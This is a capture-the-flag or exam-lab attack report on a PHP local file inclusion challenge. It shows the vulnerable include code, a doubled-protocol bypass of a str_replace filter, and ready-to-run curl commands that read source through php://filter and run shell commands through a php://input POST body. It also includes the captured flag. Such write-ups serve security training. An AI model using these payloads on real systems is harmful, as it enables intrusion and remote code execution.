# Attack Report -- cisppte-lfi-phpfilter

## Target Summary
- URL: http://121.41.79.208:83/
- Services detected: HTTP (nginx/Apache), PHP
- Technologies: PHP, Bootstrap, CISP-PTE exam platform
- Challenge: File Inclusion Vulnerability (文件包含漏洞)

## Vulnerability Discovered
- Type: Local File Inclusion (LFI) via PHP wrappers with str_replace bypass
- Location: `/start/index.php?page=`
- Parameter: `page`
- How it was found: Manual code audit of the web page and PHP filter probing

## Vulnerable Code
```php
$page = $_GET['page'];
$page = str_replace("php://", "", $page);
$page = str_replace("file://", "", $page);
$page = str_replace("data://", "", $page);
// ... (8 more protocols filtered)
include($page);
```

The code strips protocol prefixes via `str_replace` but this is trivially bypassable
by double-writing the protocol: `phpphp://://` becomes `php://` after the filter.

## Exploitation Chain

### Step 1: Reconnaissance
```bash
curl -s 'http://121.41.79.208:83/start/index.php?page=hello'
```
Revealed a "文件包含漏洞" (File Inclusion Vulnerability) challenge page with a `page` parameter.

### Step 2: Source Code Recovery via PHP Filter
```bash
curl -s 'http://121.41.79.208:83/start/index.php?page=phpphp://://filter/convert.base64-encode/resource=index.php'
```
Used double-write bypass (`phpphp://://` -> `php://`) to evade the `str_replace` filter.
Decoded base64 to recover the full source code of index.php.

### Step 3: RCE via php://input Wrapper
```bash
curl -s -X POST 'http://121.41.79.208:83/start/index.php?page=phpphp://://input' \
  -d '<?php system("ls -la /var/www/html/"); ?>'
```
Exploited `php://input` wrapper (bypassed via `phpphp://://input`) to execute arbitrary
PHP code via POST body, achieving Remote Code Execution.

### Step 4: Flag File Discovery and Extraction
```
Directory listing revealed: /var/www/html/key.cisp (15 bytes)
```
```bash
curl -s 'http://121.41.79.208:83/start/index.php?page=phpphp://://filter/resource=/var/www/html/key.cisp'
```
Read the key file, which contained the flag.

## Flag Captured
| Flag | Location | Method |
|------|----------|--------|
| key{bvz4s9qy} | /var/www/html/key.cisp | PHP filter LFI with str_replace bypass |

## Key Techniques Used
1. **str_replace bypass**: Double-writing `phpphp://://` to defeat protocol filter
2. **php://filter**: Read source code via base64 encoding
3. **php://input**: Achieved RCE by sending PHP code in POST body
4. **Directory enumeration**: Used RCE to locate `key.cisp` in web root

## Lessons Learned
- `str_replace` is a weak filter for protocol blocking -- it can be bypassed by nesting the blocked string within itself
- PHP wrappers (`php://filter`, `php://input`) do NOT require `allow_url_include = On`
- When include output goes AFTER echo on the page, grep for the `>>` marker will miss the actual file content

## Files Saved
- recon/: index-decoded.php, phpfilter-bypass.html, passwd-filter.html, rce-input.html
- exploits/: (RCE via php://input)
- flags/: flag.txt
